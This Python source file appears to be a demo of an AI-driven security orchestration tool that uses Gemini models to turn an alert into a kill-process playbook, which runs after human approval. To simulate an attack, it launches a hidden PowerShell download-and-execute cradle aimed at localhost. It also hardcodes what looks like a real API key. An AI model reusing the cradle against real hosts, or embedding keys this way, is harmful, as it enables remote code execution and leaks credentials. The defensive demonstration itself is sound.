"""SentinelOneX V3.0 Demo – API‑Powered SOAR
Author: Your Name <you@example.com>
License: MIT
"""

import os
import sys
import json
import gradio as gr
import google.generativeai as genai
import jsonschema
from jsonschema import validate
import asyncio
import subprocess  # <-- NEW: To run real processes
import os          # <-- NEW: To get PIDs and kill processes
import time        # <-- NEW: To give processes time to start
import psutil      # <-- NEW: For process monitoring
import threading   # <-- NEW: For background threads

# --- Configuration ---
api_key = os.getenv("GOOGLE_API_KEY")
if not api_key:
    print("[WARNING] GOOGLE_API_KEY environment variable not set!")
    print("[WARNING] Please set: $env:GOOGLE_API_KEY='your-api-key'")
    # For development only - use your key here temporarily
    api_key = "AIzaSyAvl7mBKFL3xm9hxUbSaOdF2a48OCqLJvY"

genai.configure(api_key=api_key)

# --- Global Sentry Control ---
sentry_active = threading.Event()

# --- AI Model Definitions ---
v1_analyst_model = genai.GenerativeModel('gemini-2.5-flash')
v3_expert_model = genai.GenerativeModel('gemini-2.5-pro')

# --- Schemas ---
analyst_prompt = """
# ROLE: CYBER SECURITY ANALYST (V1.0)
# TASK: Analyze the provided security alert data and generate a human-readable report.
# OUTPUT FORMAT: Strict JSON
# {{
#  "summary": "Brief, 1-2 sentence summary of the critical threat.",
#  "mitre_technique": "MITRE ATT&CK Technique ID and Name (e.g., T1059.001 - PowerShell).",
#  "human_remediation": [
#    "Step 1:...",
#    "Step 2:...",
#    "Step 3:..."
#  ]
# }}
# ---
# ALERT DATA:
# {alert_data}
"""

expert_prompt = """
# ROLE: EXPERT SOAR ENGINEER (V3.0)
# TASK: Convert the V1 Analyst report and original alert data into a V3 machine-readable JSON playbook.
# CONSTRAINTS:
# 1.  Validate the original alert data against the 'alert_schema'.
# 2.  Generate a playbook that is 100% compliant with the 'playbook_schema'.
# 3.  If schema validation fails, return a JSON error object: {{"validation_status": "FAILED", "error": "details..."}}
# 4.  If successful, return a JSON object: {{"validation_status": "PASSED", "playbook": {{...}}}}
# ---
# YOUR AVAILABLE REMEDIATION COMMANDS:
# 1. "kill_process": {{"pid": <process_id_number>}}
# 2. "quarantine_file": {{"file_hash": "<sha256_hash>", "file_path": "<full_path>"}}
# 3. "remove_persistence": {{"registry_key": "<full_registry_key_path>"}}
# 4. "isolate_host": {{"hostname": "<target_hostname>"}}
#
# TASK: The PowerShell cradle indicates a fileless attack that may try to set up persistence.
# Your playbook MUST include:
# 1. A 'kill_process' action for the detected PID.
# 2. A 'remove_persistence' action (make up a plausible registry key like 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\malware').
# ---
# ALERT SCHEMA (FOR VALIDATION):
{alert_schema}
# ---
# PLAYBOOK SCHEMA (FOR GENERATION):
{playbook_schema}
# ---
# V1 ANALYST REPORT:
{v1_report}
# ---
# ORIGINAL ALERT DATA:
{alert_data}
"""

# Convert format placeholders to use safe f-string style
def format_expert_prompt(alert_schema, playbook_schema, v1_report, alert_data):
    """Format the expert prompt with proper escaping."""
    return expert_prompt.format(
        alert_schema=alert_schema,
        playbook_schema=playbook_schema,
        v1_report=v1_report,
        alert_data=alert_data
    )

alert_schema = {
    "$schema": "http://json-schema.org/draft-07/schema#",
    "title": "SentinelOneX Alert",
    "type": "object",
    "properties": {
        "timestamp": {"type": "string", "format": "date-time"},
        "hostname": {"type": "string"},
        "process_name": {"type": "string"},
        "process_id": {"type": "integer"},  # <-- CHANGED: We will use a real PID
        "process_commandline": {"type": "string"},
    },
    "required": ["timestamp", "hostname", "process_name", "process_id"]
}

playbook_schema = {
    "$schema": "http://json-schema.org/draft-07/schema#",
    "title": "SentinelOneX Playbook",
    "type": "object",
    "properties": {
        "id": {"type": "string", "pattern": "^playbook-.*$"},
        "case_id": {"type": "string"},
        "generated_by": {"type": "string"},
        "confidence": {"type": "number", "minimum": 0.0, "maximum": 1.0},
        "actions": {
            "type": "array",
            "items": {
                "type": "object",
                "properties": {
                    "id": {"type": "string"},
                    "command": {"type": "string", "enum": ["kill_process", "quarantine_file", "isolate_host", "remove_persistence"]},
                    "params": {"type": "object"},
                },
                "required": ["id", "command", "params"]
            }
        }
    },
    "required": ["id", "case_id", "generated_by", "actions"]
}

# --- mcp-testbench Imports (from our previous step) ---
from mcp_testbench.engine import TestEngine
from mcp_testbench.reporter import compute_score

def safe_json_loads(json_string):
    try:
        if json_string.startswith("```json"):
            json_string = json_string[7:]
        if json_string.endswith("```"):
            json_string = json_string[:-3]
        json_string = json_string.strip()
        return json.loads(json_string)
    except json.JSONDecodeError:
        print(f"--- AI JSON PARSE ERROR ---\n{json_string}\n--- END ERROR ---")
        return {"error": "Invalid JSON format received from AI."}

# --- NEW: Real Simulation & Remediation ---
def launch_real_threat():
    print("[SIMULATION] Launching realistic threat (PowerShell cradle)...")
    # This simulates a common attack but is HARMLESS.
    # It just tries to download a non-existent file from your own machine.
    cmd_to_run = 'powershell.exe -NoP -WindowStyle Hidden "IEX (New-Object Net.WebClient).DownloadString(\'http://127.0.0.1/nonexistent-malware.ps1\')"'
    
    # We use shell=True to allow powershell.exe to be found
    DETACHED_PROCESS = 0x00000008
    process = subprocess.Popen(cmd_to_run, shell=True, creationflags=DETACHED_PROCESS)
    
    pid = process.pid
    print(f"[SIMULATION] Launched realistic threat (PowerShell cradle) with PID: {pid}")
    time.sleep(1)
    
    real_alert_data = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "hostname": "DESKTOP-B3351V9",
        "process_name": "powerskey.exe",
        "process_id": pid,
        "process_commandline": cmd_to_run
    }
    return real_alert_data

def execute_playbook(playbook_obj):
    execution_log = []
    if playbook_obj.get("validation_status") != "PASSED":
        execution_log.append("[EXECUTION] Playbook validation FAILED. No actions taken.")
        return "\n".join(execution_log)
    playbook = playbook_obj.get("playbook", {})
    actions = playbook.get("actions", [])
    if not actions:
        execution_log.append("[EXECUTION] Playbook is valid but contains no actions.")
        return "\n".join(execution_log)
    execution_log.append(f"[EXECUTION] Received playbook {playbook.get('id')}. Executing {len(actions)} actions...")
    for i, action in enumerate(actions):
        command = action.get("command")
        params = action.get("params", {})
        action_log = f"  [ACTION {i+1}] {command.upper()}: "
        if command == "kill_process":
            pid_to_kill = params.get("pid") or params.get("process_id")
            if pid_to_kill:
                try:
                    subprocess.run(["taskkill", "/F", "/PID", str(pid_to_kill)], check=True, capture_output=True)
                    action_log += f"SUCCESS. Terminated process with PID {pid_to_kill}."
                    print(f"[EXECUTION] Terminated PID: {pid_to_kill}")
                except subprocess.CalledProcessError:
                    action_log += f"FAILED. Process with PID {pid_to_kill} not found or access denied."
                except Exception as e:
                    action_log += f"ERROR. Failed to kill PID {pid_to_kill}: {e}"
            else:
                action_log += "SKIPPED. No 'pid' found in params."
        elif command == "quarantine_file":
            file_path = params.get("file_path") or params.get("file_hash", "N/A")
            action_log += f"SKIPPED (Simulation). Would quarantine file: {file_path}"
            print(f"[EXECUTION] SIMULATED: Quarantine {file_path}")
        elif command == "remove_persistence":
            reg_key = params.get("registry_key", "N/A")
            action_log += f"SKIPPED (Simulation). Would remove registry key: {reg_key}"
            print(f"[EXECUTION] SIMULATED: Remove persistence {reg_key}")
        elif command == "isolate_host":
            hostname = params.get("hostname")
            action_log += f"SKIPPED (Simulation). Would isolate host: {hostname}"
        else:
            action_log += f"SKIPPED. Unknown command '{command}'."
        execution_log.append(action_log)
    execution_log.append("[EXECUTION] Playbook complete.")
    return "\n".join(execution_log)

# --- PART 2: Proactive Sentry Background Monitoring ---
def sentry_monitor_loop(initial_threat_handler):
    """Background worker thread that monitors processes for threats."""
    print("[SENTRY] Sentry thread activated. Monitoring processes...")

    while sentry_active.is_set():
        try:
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                if not proc.info['cmdline']:
                    continue  # Skip processes with no command line
                
                cmdline = " ".join(proc.info['cmdline']).lower()
                
                # Check for the specific threat from Part 1
                if "powershell.exe" in proc.info['name'].lower() and "nonexistent-malware.ps1" in cmdline:
                    pid = proc.info['pid']
                    print(f"[SENTRY] THREAT DETECTED! PID: {pid}")
                    
                    # Stop monitoring
                    sentry_active.clear()
                    
                    # Log the threat detection
                    print("[SENTRY] Triggering automatic remediation...")
                    return f"[SENTRY] Threat detected and neutralized. PID: {pid}"
            
            # Wait 1 second before scanning again
            time.sleep(1)

        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue  # Process died or we can't access it, just continue
        except Exception as e:
            print(f"[SENTRY] Error: {e}")
            
    print("[SENTRY] Sentry thread deactivated.")
    return "Sentry Mode Deactivated."


def start_sentry():
    """Activate Sentry monitoring mode."""
    if sentry_active.is_set():
        return "Sentry is already active."
    
    sentry_active.set()
    # Start the monitor loop in a new thread
    thread = threading.Thread(target=sentry_monitor_loop, args=(None,), daemon=True)
    thread.start()
    return "Sentry Mode Activated. Monitoring for threats..."


def stop_sentry():
    """Deactivate Sentry monitoring mode."""
    sentry_active.clear()
    return "Sentry Mode Deactivating..."


# --- PART 3 & 4: Generator-based detection and analysis flow ---
def run_detection_and_analysis_flow(initial_log_message=""):
    """Generator function that streams the detection and analysis process."""
    log = initial_log_message
    
    # --- 1. LAUNCH THREAT ---
    log += "[1/5] Launching simulated threat (PowerShell cradle)...\n"
    yield log, None, None, None, gr.Button(visible=False), gr.Button(visible=False)
    
    try:
        real_alert_data = launch_real_threat()
        alert_data_str = json.dumps(real_alert_data)
        log += f"[2/5] THREAT DETECTED! PID: {real_alert_data['process_id']}\n"
        yield log, None, None, None, gr.Button(visible=False), gr.Button(visible=False)
    except Exception as e:
        log += f"[ERROR] Failed to launch simulation: {e}\n"
        yield log, None, None, None, gr.Button(visible=False), gr.Button(visible=False)
        return

    # --- 2. V1 ANALYST AI ---
    log += "[3/5] Sending data to V1 Analyst AI (Gemini 2.5 Flash)...\n"
    yield log, None, None, None, gr.Button(visible=False), gr.Button(visible=False)
    
    try:
        v1_prompt_filled = analyst_prompt.format(alert_data=alert_data_str)
        v1_response = v1_analyst_model.generate_content(v1_prompt_filled)
        v1_report = safe_json_loads(v1_response.text)
        log += "V1 Analyst report received.\n"
        yield log, v1_report, None, None, gr.Button(visible=False), gr.Button(visible=False)
    except Exception as e:
        log += f"[ERROR] V1 Analyst AI Failed: {e}\n"
        yield log, {"error": str(e)}, None, None, gr.Button(visible=False), gr.Button(visible=False)
        return

    # --- 3. V3 EXPERT AI ---
    log += "[4/5] Sending data to V3 Expert AI (Gemini 2.5 Pro)...\n"
    yield log, v1_report, None, None, gr.Button(visible=False), gr.Button(visible=False)
    
    try:
        v3_prompt_filled = format_expert_prompt(
            alert_schema=json.dumps(alert_schema, indent=2),
            playbook_schema=json.dumps(playbook_schema, indent=2),
            v1_report=json.dumps(v1_report, indent=2),
            alert_data=alert_data_str
        )
        v3_response = v3_expert_model.generate_content(v3_prompt_filled)
        v3_playbook_response = safe_json_loads(v3_response.text)
        log += "V3 Expert Playbook received and validated.\n"
        yield log, v1_report, v3_playbook_response, v3_playbook_response, gr.Button(visible=False), gr.Button(visible=False)
    except Exception as e:
        log += f"[ERROR] V3 Expert AI Failed: {e}\n"
        yield log, v1_report, {"error": str(e)}, None, gr.Button(visible=False), gr.Button(visible=False)
        return

    # --- 4. AWAIT APPROVAL ---
    if v3_playbook_response.get("validation_status") == "PASSED":
        log += "[5/5] AI plan generated. Awaiting human approval...\n"
        yield log, v1_report, v3_playbook_response, v3_playbook_response, gr.Button(visible=True), gr.Button(visible=True)
    else:
        log += f"[5/5] AI plan FAILED validation. Cannot proceed. Error: {v3_playbook_response.get('error')}\n"
        yield log, v1_report, v3_playbook_response, None, gr.Button(visible=False), gr.Button(visible=False)


def execute_approved_plan(playbook_obj):
    """Execute the approved remediation plan with streaming output."""
    log = "[EXECUTION] Human operator APPROVED the plan.\n"
    log += "Running remediation...\n"
    yield log  # Start streaming the execution log
    
    execution_steps = execute_playbook(playbook_obj)  # Your old function
    log += execution_steps
    
    log += "\n--- REMEDIATION COMPLETE ---"
    yield log


def deny_plan():
    """Deny the proposed remediation plan."""
    return "[EXECUTION] Human operator DENIED the plan. No action taken."


async def run_security_scan(target_url):
    if not target_url:
        return {"error": "No target URL provided."}, "Error: No URL"
    if not target_url.startswith('http://') and not target_url.startswith('https://'):
        target_url = 'http://' + target_url
    print(f"Starting MCP security scan on: {target_url}")
    try:
        engine = TestEngine(base_url=target_url)
        results = await engine.run_all()
        score = compute_score(results)
        print(f"Scan complete. Score: {score}")
        return results, f"Security Score: {score}"
    except Exception as e:
        error_message = f"Scan failed: {str(e)}"
        print(error_message)
        return {"error": error_message, "target": target_url}, "Scan Failed"

# ------------------------------------------------------------------
# 5️⃣  Gradio UI
# ------------------------------------------------------------------
with gr.Blocks(theme=gr.themes.Monochrome()) as demo:
    gr.Markdown("# SentinelOneX V3.0 – AI-Powered SOAR Demo")
    with gr.Tabs():
        with gr.Tab("Real End-to-End Remediation"):
            gr.Markdown("## 🎯 Mission Control - Interactive Threat Response")
            
            with gr.Column():
                simulate_button = gr.Button("Launch Threat & Initiate Analysis", variant="danger")
            
            # Mission Control Log (streaming output)
            live_event_log = gr.Textbox(label="Mission Control Log", lines=15, interactive=False)
            
            # State to hold the playbook for approval
            playbook_state = gr.State()
            
            with gr.Row():
                with gr.Column():
                    gr.Markdown("## V1.0 Analyst AI Report (Flash)")
                    output_analyst = gr.JSON(label="Analyst Report")
                with gr.Column():
                    gr.Markdown("## V3.0 Expert Playbook (Pro)")
                    output_expert = gr.JSON(label="Remediation Playbook")
            
            # Approval/Denial Buttons
            with gr.Row():
                approve_btn = gr.Button("✅ Approve Remediation Plan", variant="primary", visible=False)
                deny_btn = gr.Button("❌ Deny Plan", variant="stop", visible=False)
            
            # Wire the main simulation button
            simulate_button.click(
                fn=run_detection_and_analysis_flow,
                inputs=[],
                outputs=[
                    live_event_log,
                    output_analyst,
                    output_expert,
                    playbook_state,
                    approve_btn,
                    deny_btn
                ]
            )

            # Wire the APPROVE button
            approve_btn.click(
                fn=execute_approved_plan,
                inputs=[playbook_state],
                outputs=[live_event_log]
            ).then(
                fn=lambda: (gr.Button(visible=False), gr.Button(visible=False)),
                inputs=[],
                outputs=[approve_btn, deny_btn]
            )

            # Wire the DENY button
            deny_btn.click(
                fn=deny_plan,
                inputs=[],
                outputs=[live_event_log]
            ).then(
                fn=lambda: (gr.Button(visible=False), gr.Button(visible=False)),
                inputs=[],
                outputs=[approve_btn, deny_btn]
            )

        with gr.Tab("Proactive Sentry Mode"):
            gr.Markdown("## 🛡️ Proactive Sentry Mode\nActivate to automatically monitor for threats in the background. If a threat is found, it will trigger the full AI remediation.")
            
            with gr.Row():
                start_sentry_btn = gr.Button("Activate Sentry")
                stop_sentry_btn = gr.Button("Deactivate Sentry")
            
            sentry_log = gr.Textbox(label="Sentry Log", lines=10, interactive=False)

            # Wire the sentry buttons
            start_sentry_btn.click(
                fn=start_sentry,
                inputs=[],
                outputs=[sentry_log]
            )
            stop_sentry_btn.click(
                fn=stop_sentry,
                inputs=[],
                outputs=[sentry_log]
            )

        with gr.Tab("On-Demand Security Scan (MCP Testbench)"):
            gr.Markdown(
                "## 🔍 Run Security Scan\n"
                "Enter a URL to test its security against the MCP Testbench. "
            )
            with gr.Row():
                scan_url_input = gr.Textbox(
                    label="Target URL", 
                    placeholder="e.g., http://localhost:8000 or mcp.yourcompany.com"
                )
            scan_button = gr.Button("Start Security Scan", variant="primary")
            gr.Markdown("### Scan Results")
            scan_score_output = gr.Label(label="Security Score")
            scan_report_output = gr.JSON(label="Full JSON Report")
            scan_button.click(
                fn=run_security_scan,
                inputs=[scan_url_input],
                outputs=[scan_report_output, scan_score_output]
            )
# ------------------------------------------------------------------
# 6️⃣  Entrypoint
# ------------------------------------------------------------------
if __name__ == "__main__":
    demo.launch()
